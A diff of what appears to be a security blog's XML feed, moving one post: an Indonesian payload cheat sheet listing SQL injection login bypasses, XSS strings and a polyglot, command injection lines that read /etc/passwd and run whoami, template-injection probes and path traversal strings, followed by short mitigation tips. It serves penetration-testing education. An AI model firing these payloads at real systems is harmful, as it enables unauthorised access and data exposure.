@@ -58,31 +58,6 @@
   
   
   <entry>
-    <title>SQLi Authentication Bypass, XSS, XSS Polyglots, Command Injection, SSTI, Path Traversal</title>
-    <link href="/1a2b3c4d-5e6f-47b8-9a0b-1c2d3e4f5a6b/"/>
-    <url>/1a2b3c4d-5e6f-47b8-9a0b-1c2d3e4f5a6b/</url>
-    
-    <content type="html"><![CDATA[<p>SQLi Auth Bypass lewati login, XSS dan XSS Polyglots eksekusi skrip di browser, Command Injection jalanin perintah server, SSTI injeksi template, Path Traversal akses file sensitif.</p><p><strong>SQLi Authentication Bypass</strong></p><ul><li><code>&#39; or 1=1 limit 1 -- -+</code></li><li><code>&#39;=&quot;or&#39;</code></li></ul><p><strong>XSS</strong></p><ul><li><code>&quot;&gt;&lt;script&gt;alert(&#39;vulnerable&#39;)&lt;/script&gt;</code></li><li><code>&quot;&gt;&lt;img src=vulnerable onerror=alert(&#39;vulnerable&#39;) /&gt;</code></li><li><code>&quot;&gt;&lt;svg onload=alert(&#39;vulnerable&#39;)&gt;</code></li><li><code>&quot;&gt;&lt;input type=image src onerror=&quot;alert(&#39;vulnerable&#39;)&quot;&gt;</code></li></ul><p><strong>XSS Polyglots</strong></p><p>Poliglot XSS adalah string yang mampu disuntikkan ke dalam beberapa konteks yang berbeda dan masih menghasilkan eksekusi JavaScript, ini bekerja di lebih dari 20 konteks.</p><ul><li>payload for xss polyglots<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs polyglots">jaVasCript:/*-/*`/*`/*&#x27;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;x3csVg/&lt;sVg/oNloAd=alert()//&gt;x3e<br></code></pre></td></tr></table></figure></li></ul><p>Kelemahan poliglot adalah mudah terdeteksi oleh firewall aplikasi web (WAF), mereka cenderung cukup panjang dalam hal panjang karakter, dan mereka tidak berfungsi di setiap konteks.</p><p><strong>Command Injection</strong></p><ul><li><code>; uname -a; cat /etc/passwd</code></li><li><code>&amp; cmd /c &quot;whoami &amp; net user&quot;</code></li></ul><p><strong>SSTI</strong></p><ul><li><code>&#123;&#123; 13*37 &#125;&#125;</code></li><li><code>$&#123;&#123;13*37&#125;&#125;</code></li><li><code>&lt;%= 13*37 %&gt;</code></li><li><code>#&#123;13*37&#125;</code></li><li><code>&#123;&#123;= 13*37 &#125;&#125;</code></li></ul><p><strong>Path Traversal</strong></p><ul><li><code>../../../etc/passwd</code></li><li><code>/etc/passwd</code></li><li><code>....//....//....//etc/passwd</code></li><li><code>..%252f..%252f..%252fetc/passwd</code></li><li><code>../../../etc/passwd%00.png</code></li></ul><p>Untuk SQLi Auth Bypass, gunakan prepared statements dan validasi input. Untuk XSS dan XSS Polyglots, lakukan output encoding dan sanitasi. Untuk Command Injection, batasi eksekusi dan validasi input. Untuk SSTI, hindari evaluasi input langsung. Untuk Path Traversal, batasi akses dan normalisasi path.</p>]]></content>
-    
-    
-    <categories>
-      
-      <category>Security Researcher</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>1337rokudenashi</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>yublueflower</title>
     <link href="/3c4d5e6f-7a8b-4b9c-8d0e-1f2a3b4c5d6e/"/>
     <url>/3c4d5e6f-7a8b-4b9c-8d0e-1f2a3b4c5d6e/</url>
@@ -200,6 +175,31 @@
     <tags>
       
       <tag>ritsecctf</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>SQLi Authentication Bypass, XSS, XSS Polyglots, Command Injection, SSTI, Path Traversal</title>
+    <link href="/1a2b3c4d-5e6f-47b8-9a0b-1c2d3e4f5a6b/"/>
+    <url>/1a2b3c4d-5e6f-47b8-9a0b-1c2d3e4f5a6b/</url>
+    
+    <content type="html"><![CDATA[<p>SQLi Auth Bypass lewati login, XSS dan XSS Polyglots eksekusi skrip di browser, Command Injection jalanin perintah server, SSTI injeksi template, Path Traversal akses file sensitif.</p><p><strong>SQLi Authentication Bypass</strong></p><ul><li><code>&#39; or 1=1 limit 1 -- -+</code></li><li><code>&#39;=&quot;or&#39;</code></li></ul><p><strong>XSS</strong></p><ul><li><code>&quot;&gt;&lt;script&gt;alert(&#39;vulnerable&#39;)&lt;/script&gt;</code></li><li><code>&quot;&gt;&lt;img src=vulnerable onerror=alert(&#39;vulnerable&#39;) /&gt;</code></li><li><code>&quot;&gt;&lt;svg onload=alert(&#39;vulnerable&#39;)&gt;</code></li><li><code>&quot;&gt;&lt;input type=image src onerror=&quot;alert(&#39;vulnerable&#39;)&quot;&gt;</code></li></ul><p><strong>XSS Polyglots</strong></p><p>Poliglot XSS adalah string yang mampu disuntikkan ke dalam beberapa konteks yang berbeda dan masih menghasilkan eksekusi JavaScript, ini bekerja di lebih dari 20 konteks.</p><ul><li>payload for xss polyglots<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs polyglots">jaVasCript:/*-/*`/*`/*&#x27;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;x3csVg/&lt;sVg/oNloAd=alert()//&gt;x3e<br></code></pre></td></tr></table></figure></li></ul><p>Kelemahan poliglot adalah mudah terdeteksi oleh firewall aplikasi web (WAF), mereka cenderung cukup panjang dalam hal panjang karakter, dan mereka tidak berfungsi di setiap konteks.</p><p><strong>Command Injection</strong></p><ul><li><code>; uname -a; cat /etc/passwd</code></li><li><code>&amp; cmd /c &quot;whoami &amp; net user&quot;</code></li></ul><p><strong>SSTI</strong></p><ul><li><code>&#123;&#123; 13*37 &#125;&#125;</code></li><li><code>$&#123;&#123;13*37&#125;&#125;</code></li><li><code>&lt;%= 13*37 %&gt;</code></li><li><code>#&#123;13*37&#125;</code></li><li><code>&#123;&#123;= 13*37 &#125;&#125;</code></li></ul><p><strong>Path Traversal</strong></p><ul><li><code>../../../etc/passwd</code></li><li><code>/etc/passwd</code></li><li><code>....//....//....//etc/passwd</code></li><li><code>..%252f..%252f..%252fetc/passwd</code></li><li><code>../../../etc/passwd%00.png</code></li></ul><p>Untuk SQLi Auth Bypass, gunakan prepared statements dan validasi input. Untuk XSS dan XSS Polyglots, lakukan output encoding dan sanitasi. Untuk Command Injection, batasi eksekusi dan validasi input. Untuk SSTI, hindari evaluasi input langsung. Untuk Path Traversal, batasi akses dan normalisasi path.</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Security Researcher</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>1337rokudenashi</tag>
       
     </tags>
     
